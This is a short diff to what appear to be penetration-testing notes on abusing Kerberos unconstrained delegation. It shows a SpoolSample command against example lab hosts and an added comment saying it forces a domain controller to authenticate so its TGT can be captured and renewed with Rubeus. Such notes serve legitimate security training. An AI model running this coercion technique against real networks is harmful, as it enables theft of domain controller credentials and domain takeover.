@@ -86,6 +86,7 @@ Check the `TRUSTED_FOR_DELEGATION` property.
   .\SpoolSample.exe <TargetServer> <CaptureServer>
   # Example
   .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+  # This should force DC01 to auth to SQL01 thus giving us the TGT of the DC
   ```
   Renew the captured TGT w/ Rubeus
   ```powershell
